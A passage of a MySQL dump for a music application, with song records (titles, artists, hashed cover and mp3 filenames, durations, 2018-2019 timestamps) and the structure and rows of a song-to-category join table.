INSERT INTO `song` VALUES (130, '過ぎ去りし夏 ', 'Aleile', '', 'D9EE94CE47108889FB14B7BFE74AA352_823790121.jpg', 'D9EE94CE47108889FB14B7BFE74AA352_Aleile - 過ぎ去りし夏.mp3', 0, 0, 0, 210, '2018-08-24 15:26:38', '2018-08-24 15:26:38');
INSERT INTO `song` VALUES (131, 'Skin', 'Rag\'N\'Bone Man', '', '6EBB9F3C95FC64DFFA669AF76554DA9D_-1592185093.jpg', '6EBB9F3C95FC64DFFA669AF76554DA9D_Rag\'N\'Bone Man - Skin.mp3', 0, 0, 0, 240, '2018-08-24 15:28:17', '2018-08-24 15:28:17');
INSERT INTO `song` VALUES (132, 'Rage Your Dream', 'm.o.v.e', '', '7275BB3AD2C6BAB836628197EB2B42FE_302931260.jpg', '7275BB3AD2C6BAB836628197EB2B42FE_m.o.v.e - Rage Your Dream.mp3', 0, 0, 0, 272, '2018-08-24 15:29:10', '2018-08-24 15:29:10');
INSERT INTO `song` VALUES (133, 'The Cup Of Life (La Copa De La Vida) (Original English Version)', 'Ricky Martin', '', 'CFF43E4F9E9965BAD282AD5EF8B16A28_-1278130561.jpg', 'CFF43E4F9E9965BAD282AD5EF8B16A28_Ricky Martin - The Cup Of Life (La Copa De La Vida) (Original English Version).mp3', 0, 0, 0, 272, '2018-08-24 15:30:30', '2018-08-24 15:30:30');
INSERT INTO `song` VALUES (134, 'Tassel ', 'Cymophane', '', 'F01188A37B00C789F79A047286561FF7_222818790.jpg', 'F01188A37B00C789F79A047286561FF7_Cymophane - Tassel.mp3', 0, 0, 0, 270, '2018-08-24 15:31:17', '2018-08-24 15:31:17');
INSERT INTO `song` VALUES (135, 'again ~アニメ Version~', 'YUI', '', '9AA8FEE75343DC76C0C4129BB0261C34_-1077874238.jpg', '9AA8FEE75343DC76C0C4129BB0261C34_YUI - again ~アニメ Version~.mp3', 0, 0, 0, 100, '2018-08-24 15:32:42', '2018-08-24 15:32:42');
INSERT INTO `song` VALUES (136, 'Rolling In the Deep (Piano/cello Instrumental Cover) - instrumental', 'Jon Schmidt', '', 'B31D5E5B3B6E160AAFDBEE1F9D0BCFA9_-177657249.jpg', 'B31D5E5B3B6E160AAFDBEE1F9D0BCFA9_Jon Schmidt - Rolling In the Deep (Piano／cello Instrumental Cover) - instrumental.mp3', 0, 0, 0, 232, '2018-08-24 15:34:09', '2018-08-24 15:34:09');
INSERT INTO `song` VALUES (137, '緋色月下、狂咲ノ絶　-1st Anniversary Remix-', 'nayuta', '', 'DCF26CCA2BC043940077F957D61994D4_-1642817248.jpg', 'DCF26CCA2BC043940077F957D61994D4_nayuta - 緋色月下、狂咲ノ絶　-1st Anniversary Remix-.mp3', 0, 0, 0, 367, '2018-08-24 15:35:28', '2018-08-24 15:35:28');
INSERT INTO `song` VALUES (138, 'In Love ', 'July', '', '9BF953B54C5B6AC708AF8C06D261C98A_1316121610.jpg', '9BF953B54C5B6AC708AF8C06D261C98A_July - In Love.mp3', 0, 0, 0, 233, '2018-08-24 15:37:05', '2018-08-24 15:37:05');
INSERT INTO `song` VALUES (139, '星の在り処 ', 'う～み', '', '073DCCCE21F60D0F8355605A793A4A7D_617721308.jpg', '073DCCCE21F60D0F8355605A793A4A7D_う～み - 星の在り処.mp3', 0, 0, 0, 284, '2018-08-24 15:38:12', '2018-08-24 15:38:12');
INSERT INTO `song` VALUES (140, '终わりの世界から', 'やなぎなぎ', '', 'F1EBDF4B474B29F16A9F6DCB700B3BD8_-258260523.jpg', 'F1EBDF4B474B29F16A9F6DCB700B3BD8_やなぎなぎ - 终わりの世界から.mp3', 0, 0, 0, 365, '2018-08-24 15:40:16', '2018-08-24 15:40:16');
INSERT INTO `song` VALUES (141, 'Inspire ', 'Capo Productions', '', '6D62F0C8E3620B1538E79F14CD9D8AFE_-968807990.jpg', '6D62F0C8E3620B1538E79F14CD9D8AFE_Capo Productions - Inspire.mp3', 0, 0, 0, 219, '2018-08-24 15:41:12', '2018-08-24 15:41:12');
INSERT INTO `song` VALUES (142, 'Love Paradise ', '陈慧琳', '', '707793341385E8050B3D0F5DCD71BEFF_1663357773.jpg', '707793341385E8050B3D0F5DCD71BEFF_陈慧琳 - Love Paradise.mp3', 0, 0, 0, 196, '2018-08-24 15:42:36', '2018-08-24 15:42:36');
INSERT INTO `song` VALUES (143, 'Waving flag ', 'K\'Naan', '', 'E05ED0C636A421EA7A963962384EBA66_-601311435.jpg', 'E05ED0C636A421EA7A963962384EBA66_K\'Naan,David Guetta,will.i.am - Waving flag.mp3', 0, 0, 0, 221, '2018-08-24 15:43:57', '2018-08-24 15:43:57');
INSERT INTO `song` VALUES (144, 'Endless', 'Natio / CLAW$', '', 'BB39D37FF88221D1D1E9983B4DA7FD95_-1147099645.jpg', 'BB39D37FF88221D1D1E9983B4DA7FD95_Natio,CLAW$ - Endless.mp3', 0, 0, 0, 257, '2018-08-24 15:45:09', '2018-08-24 15:45:09');
INSERT INTO `song` VALUES (145, 'Higher', 'Tobu', '', '82E5E72616C23C242DDDDF4BBF46FCC5_-97227451.jpg', '82E5E72616C23C242DDDDF4BBF46FCC5_Tobu - Higher.mp3', 0, 0, 0, 213, '2018-08-24 15:46:21', '2018-08-24 15:46:21');
INSERT INTO `song` VALUES (146, 'Adventures', 'Alex Skrindo', '', '53EBF0EF63F0E5901F35D28B26AF76C0_-304873486.jpg', '53EBF0EF63F0E5901F35D28B26AF76C0_Alex Skrindo - Adventures.mp3', 0, 0, 0, 219, '2018-08-24 15:47:06', '2018-08-24 15:47:06');
INSERT INTO `song` VALUES (147, 'Journey ', 'Capo Productions', '', 'E935D389797634ADBBAF91CF6AA2A4CB_-968807990.jpg', 'E935D389797634ADBBAF91CF6AA2A4CB_Capo Productions - Journey.mp3', 0, 0, 0, 180, '2018-08-24 15:48:02', '2018-08-24 15:48:02');
INSERT INTO `song` VALUES (148, 'Home', 'Edward Sharpe & The Magnetic Zeros', '', '8F5631104ED06E2145488ECF855F03E1_-2075377198.jpg', '8F5631104ED06E2145488ECF855F03E1_Edward Sharpe & The Magnetic Zeros - Home.mp3', 0, 0, 0, 306, '2018-08-24 17:11:59', '2018-08-24 17:11:59');
INSERT INTO `song` VALUES (149, 'Battles and Wastelands', 'Neo Retros', '', 'DCE2ED7AA9A7BB6EFF92F5957B832D1C_1905306918.jpg', 'DCE2ED7AA9A7BB6EFF92F5957B832D1C_Battles and Wastelands .mp3', 0, 0, 0, 172, '2018-08-24 17:15:22', '2018-08-24 17:15:22');
INSERT INTO `song` VALUES (150, 'As Long as You Love Me  ', 'Backstreet Boys', '', 'AB56C75097B6EEDB3C5F5B809216E97F_1958327885.jpg', 'AB56C75097B6EEDB3C5F5B809216E97F_As Long as You Love Me.mp3', 0, 0, 0, 212, '2018-08-24 17:17:08', '2018-08-24 17:17:08');
INSERT INTO `song` VALUES (151, 'Brave Shine ', 'Aimer', '', '8000C0264664F5B375DD61A16C117FF6_-1098344579.jpg', '8000C0264664F5B375DD61A16C117FF6_Brave Shine.mp3', 0, 0, 0, 234, '2018-08-24 17:19:40', '2018-08-24 17:19:40');
INSERT INTO `song` VALUES (152, 'Immortals', 'Fall Out Boy', '', 'E5E06268DCD0AC3966330068406C19E4_-1714109311.jpg', 'E5E06268DCD0AC3966330068406C19E4_Immortals,End Credit Version.mp3', 0, 0, 0, 193, '2018-08-24 17:21:15', '2018-08-24 17:21:15');
INSERT INTO `song` VALUES (153, 'Counting Stars', 'OneRepublic', '', '0E93399528F2E70369B86D2BBAF44BF0_-1202523201.jpg', '0E93399528F2E70369B86D2BBAF44BF0_Counting Stars.mp3', 0, 0, 0, 257, '2018-08-24 17:22:05', '2018-08-24 17:22:05');
INSERT INTO `song` VALUES (154, 'Love Yourself', 'Justin Bieber', '', '8B041BF32CDCC576DE30CF8C18352F34_1038299475.jpg', '8B041BF32CDCC576DE30CF8C18352F34_Justin Bieber - Love Yourself.mp3', 0, 0, 0, 234, '2018-08-24 17:23:42', '2018-08-24 17:23:42');
INSERT INTO `song` VALUES (156, 'Shape of You', 'Ed Sheeran', '', 'B24A5ACCD32F3D63374BA73BC57BB299_-305636722.jpg', 'B24A5ACCD32F3D63374BA73BC57BB299_Shape of You.mp3', 0, 0, 0, 231, '2018-08-24 17:30:35', '2018-08-24 17:30:35');
INSERT INTO `song` VALUES (157, 'Sun', 'Steerner / Martell', '', '3F05A28AC4F6999A8C79AAAB7E1B2C84_1636890982.jpg', '3F05A28AC4F6999A8C79AAAB7E1B2C84_Sun.mp3', 0, 0, 0, 210, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song` VALUES (158, 'Take My Hand', 'Simple Plan', '', 'F661E1DBD81CD460FA129A78CF475AE2_-1528547069.jpg', 'F661E1DBD81CD460FA129A78CF475AE2_Take My Hand.mp3', 0, 0, 0, 232, '2018-08-24 17:33:56', '2018-08-24 17:33:56');
INSERT INTO `song` VALUES (159, 'The Phoenix', 'Fall Out Boy', '', 'CFC4291905B9D4EE2B27A6480763E3A2_-258658691.jpg', 'CFC4291905B9D4EE2B27A6480763E3A2_The Phoenix.mp3', 0, 0, 0, 245, '2018-08-24 17:35:04', '2018-08-24 17:35:04');
INSERT INTO `song` VALUES (160, 'Viva La Vida', 'Coldplay', '', '60F4FE279989BC9EEDD18A6B4C287E53_-1886768583.jpg', '60F4FE279989BC9EEDD18A6B4C287E53_Viva La Vida.mp3', 0, 0, 0, 241, '2018-08-24 17:36:36', '2018-08-24 17:36:36');
INSERT INTO `song` VALUES (161, 'My Friend', 'SPYAIR', '', '859B7180F2CE00898438AB4B440D473B_-1769494456.jpg', '859B7180F2CE00898438AB4B440D473B_My Friend .mp3', 0, 0, 0, 231, '2018-08-24 17:38:01', '2018-08-24 17:38:01');
INSERT INTO `song` VALUES (162, 'Alice（Cover 古川本舗）', '米白', '', 'F3366EA718B8D4E161C78F0935DB1543_-1028601923.jpg?v=1537797454908', 'F3366EA718B8D4E161C78F0935DB1543_米白 - Alice（Cover 古川本舗）.mp3?v=1537797454913', 0, 0, 0, 237, '2018-09-24 21:57:26', '2018-09-24 21:57:26');
INSERT INTO `song` VALUES (163, 'Melody', 'Capo Productions', '', 'BAAE56C5760D52E870F4FF093B4FA7AA_-1078927957.jpg?v=1547433825117', 'BAAE56C5760D52E870F4FF093B4FA7AA_Capo Productions - Melody.mp3?v=1547433825117', 0, 0, 0, 116, '2019-01-14 10:43:42', '2019-01-14 10:43:42');

-- ----------------------------
-- Table structure for song_bind_song_category
-- ----------------------------
DROP TABLE IF EXISTS `song_bind_song_category`;
CREATE TABLE `song_bind_song_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT,
  `song_id` int(0) NOT NULL,
  `song_category_id` int(0) NOT NULL,
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 427 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of song_bind_song_category
-- ----------------------------
INSERT INTO `song_bind_song_category` VALUES (49, 6, 1, '2018-08-24 11:25:34', '2018-08-24 11:25:34');
INSERT INTO `song_bind_song_category` VALUES (50, 6, 3, '2018-08-24 11:25:34', '2018-08-24 11:25:34');
INSERT INTO `song_bind_song_category` VALUES (51, 7, 7, '2018-08-24 11:28:51', '2018-08-24 11:28:51');
INSERT INTO `song_bind_song_category` VALUES (52, 7, 6, '2018-08-24 11:28:51', '2018-08-24 11:28:51');
INSERT INTO `song_bind_song_category` VALUES (53, 8, 1, '2018-08-24 11:30:43', '2018-08-24 11:30:43');
INSERT INTO `song_bind_song_category` VALUES (54, 8, 8, '2018-08-24 11:30:43', '2018-08-24 11:30:43');
INSERT INTO `song_bind_song_category` VALUES (55, 9, 1, '2018-08-24 11:32:49', '2018-08-24 11:32:49');
INSERT INTO `song_bind_song_category` VALUES (56, 9, 3, '2018-08-24 11:32:49', '2018-08-24 11:32:49');
INSERT INTO `song_bind_song_category` VALUES (57, 12, 8, '2018-08-24 11:35:52', '2018-08-24 11:35:52');
INSERT INTO `song_bind_song_category` VALUES (58, 13, 6, '2018-08-24 11:37:39', '2018-08-24 11:37:39');
INSERT INTO `song_bind_song_category` VALUES (59, 13, 1, '2018-08-24 11:37:39', '2018-08-24 11:37:39');
INSERT INTO `song_bind_song_category` VALUES (62, 15, 1, '2018-08-24 11:40:24', '2018-08-24 11:40:24');
INSERT INTO `song_bind_song_category` VALUES (63, 15, 4, '2018-08-24 11:40:24', '2018-08-24 11:40:24');
INSERT INTO `song_bind_song_category` VALUES (64, 16, 8, '2018-08-24 11:41:53', '2018-08-24 11:41:53');
INSERT INTO `song_bind_song_category` VALUES (66, 18, 1, '2018-08-24 11:46:11', '2018-08-24 11:46:11');
INSERT INTO `song_bind_song_category` VALUES (67, 18, 2, '2018-08-24 11:46:11', '2018-08-24 11:46:11');
INSERT INTO `song_bind_song_category` VALUES (68, 14, 7, '2018-08-24 11:46:52', '2018-08-24 11:46:52');
INSERT INTO `song_bind_song_category` VALUES (69, 17, 7, '2018-08-24 11:48:08', '2018-08-24 11:48:08');
INSERT INTO `song_bind_song_category` VALUES (70, 19, 4, '2018-08-24 11:49:47', '2018-08-24 11:49:47');
INSERT INTO `song_bind_song_category` VALUES (71, 20, 1, '2018-08-24 11:52:47', '2018-08-24 11:52:47');
INSERT INTO `song_bind_song_category` VALUES (72, 20, 2, '2018-08-24 11:52:47', '2018-08-24 11:52:47');
INSERT INTO `song_bind_song_category` VALUES (75, 22, 1, '2018-08-24 11:55:10', '2018-08-24 11:55:10');
INSERT INTO `song_bind_song_category` VALUES (76, 22, 6, '2018-08-24 11:55:10', '2018-08-24 11:55:10');
INSERT INTO `song_bind_song_category` VALUES (77, 23, 1, '2018-08-24 11:57:04', '2018-08-24 11:57:04');
INSERT INTO `song_bind_song_category` VALUES (78, 23, 3, '2018-08-24 11:57:04', '2018-08-24 11:57:04');
INSERT INTO `song_bind_song_category` VALUES (79, 23, 5, '2018-08-24 11:57:04', '2018-08-24 11:57:04');
INSERT INTO `song_bind_song_category` VALUES (83, 21, 1, '2018-08-24 11:57:37', '2018-08-24 11:57:37');
INSERT INTO `song_bind_song_category` VALUES (84, 21, 5, '2018-08-24 11:57:37', '2018-08-24 11:57:37');
INSERT INTO `song_bind_song_category` VALUES (85, 21, 6, '2018-08-24 11:57:37', '2018-08-24 11:57:37');
INSERT INTO `song_bind_song_category` VALUES (86, 24, 4, '2018-08-24 11:59:17', '2018-08-24 11:59:17');
INSERT INTO `song_bind_song_category` VALUES (87, 24, 1, '2018-08-24 11:59:17', '2018-08-24 11:59:17');
INSERT INTO `song_bind_song_category` VALUES (88, 25, 1, '2018-08-24 12:00:18', '2018-08-24 12:00:18');
INSERT INTO `song_bind_song_category` VALUES (89, 25, 3, '2018-08-24 12:00:18', '2018-08-24 12:00:18');
INSERT INTO `song_bind_song_category` VALUES (90, 26, 4, '2018-08-24 12:03:57', '2018-08-24 12:03:57');
INSERT INTO `song_bind_song_category` VALUES (91, 26, 1, '2018-08-24 12:03:57', '2018-08-24 12:03:57');
INSERT INTO `song_bind_song_category` VALUES (92, 27, 1, '2018-08-24 12:05:38', '2018-08-24 12:05:38');
INSERT INTO `song_bind_song_category` VALUES (93, 27, 4, '2018-08-24 12:05:38', '2018-08-24 12:05:38');
INSERT INTO `song_bind_song_category` VALUES (94, 28, 1, '2018-08-24 12:07:36', '2018-08-24 12:07:36');
INSERT INTO `song_bind_song_category` VALUES (95, 28, 6, '2018-08-24 12:07:36', '2018-08-24 12:07:36');
INSERT INTO `song_bind_song_category` VALUES (96, 28, 7, '2018-08-24 12:07:36', '2018-08-24 12:07:36');
INSERT INTO `song_bind_song_category` VALUES (97, 29, 1, '2018-08-24 12:09:37', '2018-08-24 12:09:37');
INSERT INTO `song_bind_song_category` VALUES (98, 29, 4, '2018-08-24 12:09:37', '2018-08-24 12:09:37');
INSERT INTO `song_bind_song_category` VALUES (99, 29, 8, '2018-08-24 12:09:37', '2018-08-24 12:09:37');
INSERT INTO `song_bind_song_category` VALUES (100, 30, 1, '2018-08-24 12:12:12', '2018-08-24 12:12:12');
INSERT INTO `song_bind_song_category` VALUES (101, 30, 2, '2018-08-24 12:12:12', '2018-08-24 12:12:12');
INSERT INTO `song_bind_song_category` VALUES (102, 31, 3, '2018-08-24 12:15:41', '2018-08-24 12:15:41');
INSERT INTO `song_bind_song_category` VALUES (103, 31, 5, '2018-08-24 12:15:41', '2018-08-24 12:15:41');
INSERT INTO `song_bind_song_category` VALUES (104, 32, 1, '2018-08-24 12:17:52', '2018-08-24 12:17:52');
INSERT INTO `song_bind_song_category` VALUES (105, 32, 2, '2018-08-24 12:17:52', '2018-08-24 12:17:52');
INSERT INTO `song_bind_song_category` VALUES (111, 34, 5, '2018-08-24 12:23:11', '2018-08-24 12:23:11');
INSERT INTO `song_bind_song_category` VALUES (112, 34, 3, '2018-08-24 12:23:11', '2018-08-24 12:23:11');
INSERT INTO `song_bind_song_category` VALUES (113, 35, 4, '2018-08-24 12:26:38', '2018-08-24 12:26:38');
INSERT INTO `song_bind_song_category` VALUES (116, 36, 1, '2018-08-24 12:31:16', '2018-08-24 12:31:16');
INSERT INTO `song_bind_song_category` VALUES (117, 36, 4, '2018-08-24 12:31:16', '2018-08-24 12:31:16');
INSERT INTO `song_bind_song_category` VALUES (118, 36, 7, '2018-08-24 12:31:16', '2018-08-24 12:31:16');
INSERT INTO `song_bind_song_category` VALUES (119, 37, 7, '2018-08-24 12:33:20', '2018-08-24 12:33:20');
INSERT INTO `song_bind_song_category` VALUES (120, 37, 3, '2018-08-24 12:33:20', '2018-08-24 12:33:20');
INSERT INTO `song_bind_song_category` VALUES (121, 37, 1, '2018-08-24 12:33:20', '2018-08-24 12:33:20');
INSERT INTO `song_bind_song_category` VALUES (122, 38, 1, '2018-08-24 12:35:09', '2018-08-24 12:35:09');
INSERT INTO `song_bind_song_category` VALUES (123, 38, 2, '2018-08-24 12:35:09', '2018-08-24 12:35:09');
INSERT INTO `song_bind_song_category` VALUES (124, 39, 7, '2018-08-24 12:36:37', '2018-08-24 12:36:37');
INSERT INTO `song_bind_song_category` VALUES (125, 39, 6, '2018-08-24 12:36:37', '2018-08-24 12:36:37');
INSERT INTO `song_bind_song_category` VALUES (126, 33, 3, '2018-08-24 12:37:20', '2018-08-24 12:37:20');
INSERT INTO `song_bind_song_category` VALUES (127, 33, 5, '2018-08-24 12:37:20', '2018-08-24 12:37:20');
INSERT INTO `song_bind_song_category` VALUES (128, 40, 1, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song_bind_song_category` VALUES (129, 40, 7, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song_bind_song_category` VALUES (130, 40, 6, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song_bind_song_category` VALUES (131, 40, 4, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song_bind_song_category` VALUES (132, 41, 7, '2018-08-24 12:41:06', '2018-08-24 12:41:06');
INSERT INTO `song_bind_song_category` VALUES (133, 41, 8, '2018-08-24 12:41:06', '2018-08-24 12:41:06');
INSERT INTO `song_bind_song_category` VALUES (134, 42, 7, '2018-08-24 12:43:00', '2018-08-24 12:43:00');
INSERT INTO `song_bind_song_category` VALUES (135, 43, 1, '2018-08-24 12:44:37', '2018-08-24 12:44:37');
INSERT INTO `song_bind_song_category` VALUES (136, 43, 4, '2018-08-24 12:44:37', '2018-08-24 12:44:37');
INSERT INTO `song_bind_song_category` VALUES (137, 43, 7, '2018-08-24 12:44:37', '2018-08-24 12:44:37');
INSERT INTO `song_bind_song_category` VALUES (138, 44, 7, '2018-08-24 12:46:28', '2018-08-24 12:46:28');
INSERT INTO `song_bind_song_category` VALUES (139, 44, 8, '2018-08-24 12:46:28', '2018-08-24 12:46:28');
INSERT INTO `song_bind_song_category` VALUES (140, 45, 8, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song_bind_song_category` VALUES (141, 45, 4, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song_bind_song_category` VALUES (142, 45, 1, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song_bind_song_category` VALUES (143, 45, 7, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song_bind_song_category` VALUES (144, 46, 8, '2018-08-24 12:50:41', '2018-08-24 12:50:41');
INSERT INTO `song_bind_song_category` VALUES (145, 46, 7, '2018-08-24 12:50:41', '2018-08-24 12:50:41');
INSERT INTO `song_bind_song_category` VALUES (146, 47, 7, '2018-08-24 12:51:57', '2018-08-24 12:51:57');
INSERT INTO `song_bind_song_category` VALUES (147, 47, 4, '2018-08-24 12:51:57', '2018-08-24 12:51:57');
INSERT INTO `song_bind_song_category` VALUES (148, 48, 3, '2018-08-24 12:52:53', '2018-08-24 12:52:53');
INSERT INTO `song_bind_song_category` VALUES (149, 49, 3, '2018-08-24 12:54:49', '2018-08-24 12:54:49');
INSERT INTO `song_bind_song_category` VALUES (150, 49, 5, '2018-08-24 12:54:49', '2018-08-24 12:54:49');
INSERT INTO `song_bind_song_category` VALUES (151, 50, 6, '2018-08-24 12:57:12', '2018-08-24 12:57:12');
INSERT INTO `song_bind_song_category` VALUES (152, 50, 7, '2018-08-24 12:57:12', '2018-08-24 12:57:12');
INSERT INTO `song_bind_song_category` VALUES (153, 51, 2, '2018-08-24 12:58:32', '2018-08-24 12:58:32');
INSERT INTO `song_bind_song_category` VALUES (154, 52, 2, '2018-08-24 13:00:21', '2018-08-24 13:00:21');
INSERT INTO `song_bind_song_category` VALUES (155, 52, 1, '2018-08-24 13:00:21', '2018-08-24 13:00:21');
INSERT INTO `song_bind_song_category` VALUES (156, 53, 2, '2018-08-24 13:03:56', '2018-08-24 13:03:56');
INSERT INTO `song_bind_song_category` VALUES (157, 53, 1, '2018-08-24 13:03:56', '2018-08-24 13:03:56');
INSERT INTO `song_bind_song_category` VALUES (158, 54, 2, '2018-08-24 13:05:48', '2018-08-24 13:05:48');
INSERT INTO `song_bind_song_category` VALUES (159, 54, 1, '2018-08-24 13:05:48', '2018-08-24 13:05:48');
INSERT INTO `song_bind_song_category` VALUES (160, 55, 2, '2018-08-24 13:07:34', '2018-08-24 13:07:34');
INSERT INTO `song_bind_song_category` VALUES (164, 56, 1, '2018-08-24 13:09:35', '2018-08-24 13:09:35');
INSERT INTO `song_bind_song_category` VALUES (165, 56, 3, '2018-08-24 13:09:35', '2018-08-24 13:09:35');
INSERT INTO `song_bind_song_category` VALUES (166, 56, 5, '2018-08-24 13:09:35', '2018-08-24 13:09:35');
INSERT INTO `song_bind_song_category` VALUES (167, 57, 1, '2018-08-24 13:11:09', '2018-08-24 13:11:09');
INSERT INTO `song_bind_song_category` VALUES (168, 57, 2, '2018-08-24 13:11:09', '2018-08-24 13:11:09');
INSERT INTO `song_bind_song_category` VALUES (169, 58, 3, '2018-08-24 13:12:59', '2018-08-24 13:12:59');
INSERT INTO `song_bind_song_category` VALUES (170, 59, 3, '2018-08-24 13:14:36', '2018-08-24 13:14:36');
INSERT INTO `song_bind_song_category` VALUES (171, 59, 1, '2018-08-24 13:14:36', '2018-08-24 13:14:36');
INSERT INTO `song_bind_song_category` VALUES (172, 60, 3, '2018-08-24 13:16:20', '2018-08-24 13:16:20');
INSERT INTO `song_bind_song_category` VALUES (173, 60, 1, '2018-08-24 13:16:20', '2018-08-24 13:16:20');
INSERT INTO `song_bind_song_category` VALUES (174, 60, 5, '2018-08-24 13:16:20', '2018-08-24 13:16:20');
INSERT INTO `song_bind_song_category` VALUES (175, 61, 1, '2018-08-24 13:17:56', '2018-08-24 13:17:56');
INSERT INTO `song_bind_song_category` VALUES (176, 61, 2, '2018-08-24 13:17:56', '2018-08-24 13:17:56');
INSERT INTO `song_bind_song_category` VALUES (177, 62, 1, '2018-08-24 13:19:08', '2018-08-24 13:19:08');
INSERT INTO `song_bind_song_category` VALUES (178, 62, 2, '2018-08-24 13:19:08', '2018-08-24 13:19:08');
INSERT INTO `song_bind_song_category` VALUES (179, 63, 2, '2018-08-24 13:24:35', '2018-08-24 13:24:35');
INSERT INTO `song_bind_song_category` VALUES (180, 63, 1, '2018-08-24 13:24:35', '2018-08-24 13:24:35');
INSERT INTO `song_bind_song_category` VALUES (181, 64, 1, '2018-08-24 13:26:05', '2018-08-24 13:26:05');
INSERT INTO `song_bind_song_category` VALUES (182, 64, 3, '2018-08-24 13:26:05', '2018-08-24 13:26:05');
INSERT INTO `song_bind_song_category` VALUES (183, 65, 2, '2018-08-24 13:27:11', '2018-08-24 13:27:11');
INSERT INTO `song_bind_song_category` VALUES (187, 67, 1, '2018-08-24 13:30:52', '2018-08-24 13:30:52');
INSERT INTO `song_bind_song_category` VALUES (188, 67, 9, '2018-08-24 13:30:52', '2018-08-24 13:30:52');
INSERT INTO `song_bind_song_category` VALUES (189, 67, 7, '2018-08-24 13:30:52', '2018-08-24 13:30:52');
INSERT INTO `song_bind_song_category` VALUES (190, 68, 3, '2018-08-24 13:32:57', '2018-08-24 13:32:57');
INSERT INTO `song_bind_song_category` VALUES (191, 69, 9, '2018-08-24 13:34:46', '2018-08-24 13:34:46');
INSERT INTO `song_bind_song_category` VALUES (192, 70, 9, '2018-08-24 13:35:50', '2018-08-24 13:35:50');
INSERT INTO `song_bind_song_category` VALUES (193, 70, 7, '2018-08-24 13:35:50', '2018-08-24 13:35:50');
INSERT INTO `song_bind_song_category` VALUES (194, 70, 1, '2018-08-24 13:35:50', '2018-08-24 13:35:50');
INSERT INTO `song_bind_song_category` VALUES (195, 71, 7, '2018-08-24 13:37:28', '2018-08-24 13:37:28');
INSERT INTO `song_bind_song_category` VALUES (196, 71, 6, '2018-08-24 13:37:28', '2018-08-24 13:37:28');
INSERT INTO `song_bind_song_category` VALUES (197, 66, 1, '2018-08-24 13:38:03', '2018-08-24 13:38:03');
INSERT INTO `song_bind_song_category` VALUES (198, 66, 6, '2018-08-24 13:38:03', '2018-08-24 13:38:03');
INSERT INTO `song_bind_song_category` VALUES (199, 66, 7, '2018-08-24 13:38:03', '2018-08-24 13:38:03');
INSERT INTO `song_bind_song_category` VALUES (200, 66, 9, '2018-08-24 13:38:03', '2018-08-24 13:38:03');
INSERT INTO `song_bind_song_category` VALUES (201, 72, 3, '2018-08-24 13:39:29', '2018-08-24 13:39:29');
INSERT INTO `song_bind_song_category` VALUES (202, 73, 9, '2018-08-24 13:40:31', '2018-08-24 13:40:31');
INSERT INTO `song_bind_song_category` VALUES (206, 74, 1, '2018-08-24 13:43:04', '2018-08-24 13:43:04');
INSERT INTO `song_bind_song_category` VALUES (207, 74, 3, '2018-08-24 13:43:04', '2018-08-24 13:43:04');
INSERT INTO `song_bind_song_category` VALUES (208, 75, 2, '2018-08-24 13:44:45', '2018-08-24 13:44:45');
INSERT INTO `song_bind_song_category` VALUES (209, 75, 1, '2018-08-24 13:44:45', '2018-08-24 13:44:45');
INSERT INTO `song_bind_song_category` VALUES (210, 75, 8, '2018-08-24 13:44:45', '2018-08-24 13:44:45');
INSERT INTO `song_bind_song_category` VALUES (211, 76, 8, '2018-08-24 13:46:45', '2018-08-24 13:46:45');
INSERT INTO `song_bind_song_category` VALUES (212, 76, 7, '2018-08-24 13:46:45', '2018-08-24 13:46:45');
INSERT INTO `song_bind_song_category` VALUES (214, 5, 1, '2018-08-24 13:49:17', '2018-08-24 13:49:17');
INSERT INTO `song_bind_song_category` VALUES (215, 5, 3, '2018-08-24 13:49:17', '2018-08-24 13:49:17');
INSERT INTO `song_bind_song_category` VALUES (216, 5, 5, '2018-08-24 13:49:17', '2018-08-24 13:49:17');
INSERT INTO `song_bind_song_category` VALUES (217, 77, 3, '2018-08-24 13:49:51', '2018-08-24 13:49:51');
INSERT INTO `song_bind_song_category` VALUES (218, 77, 5, '2018-08-24 13:49:51', '2018-08-24 13:49:51');
INSERT INTO `song_bind_song_category` VALUES (219, 78, 3, '2018-08-24 13:51:14', '2018-08-24 13:51:14');
INSERT INTO `song_bind_song_category` VALUES (220, 78, 5, '2018-08-24 13:51:14', '2018-08-24 13:51:14');
INSERT INTO `song_bind_song_category` VALUES (221, 78, 1, '2018-08-24 13:51:14', '2018-08-24 13:51:14');
INSERT INTO `song_bind_song_category` VALUES (222, 79, 3, '2018-08-24 13:52:14', '2018-08-24 13:52:14');
INSERT INTO `song_bind_song_category` VALUES (223, 79, 5, '2018-08-24 13:52:14', '2018-08-24 13:52:14');
INSERT INTO `song_bind_song_category` VALUES (224, 79, 1, '2018-08-24 13:52:14', '2018-08-24 13:52:14');
INSERT INTO `song_bind_song_category` VALUES (225, 80, 3, '2018-08-24 14:12:04', '2018-08-24 14:12:04');
INSERT INTO `song_bind_song_category` VALUES (226, 80, 5, '2018-08-24 14:12:04', '2018-08-24 14:12:04');
INSERT INTO `song_bind_song_category` VALUES (227, 81, 4, '2018-08-24 14:13:32', '2018-08-24 14:13:32');
INSERT INTO `song_bind_song_category` VALUES (228, 81, 1, '2018-08-24 14:13:32', '2018-08-24 14:13:32');
INSERT INTO `song_bind_song_category` VALUES (229, 81, 7, '2018-08-24 14:13:32', '2018-08-24 14:13:32');
INSERT INTO `song_bind_song_category` VALUES (230, 82, 7, '2018-08-24 14:14:51', '2018-08-24 14:14:51');
INSERT INTO `song_bind_song_category` VALUES (231, 82, 2, '2018-08-24 14:14:51', '2018-08-24 14:14:51');
